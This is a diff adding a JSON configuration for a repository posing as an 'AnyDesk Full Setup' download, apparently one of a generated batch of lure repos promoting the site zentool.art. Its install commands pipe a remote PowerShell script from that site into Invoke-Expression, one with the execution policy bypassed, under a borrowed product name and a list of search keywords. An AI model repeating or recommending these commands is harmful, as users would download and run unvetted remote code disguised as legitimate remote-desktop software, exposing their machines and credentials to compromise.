@@ -1,0 +1,29 @@
+{
+  "repo": "AnyDesk-Full-Setup",
+  "product": "AnyDesk Full Setup",
+  "product_title": "AnyDesk Suite",
+  "kind": "network",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "remote",
+  "topics": [
+    "anydesk-windows",
+    "anydesk-config",
+    "anydesk-integration",
+    "anydesk-latest",
+    "anydesk-portable",
+    "remote-desktop",
+    "remote-support",
+    "remote-session-manager",
+    "screen-sharing",
+    "file-transfer",
+    "windows-remote",
+    "desktop-support",
+    "multi-monitor"
+  ],
+  "site": "zentool.art"
+}
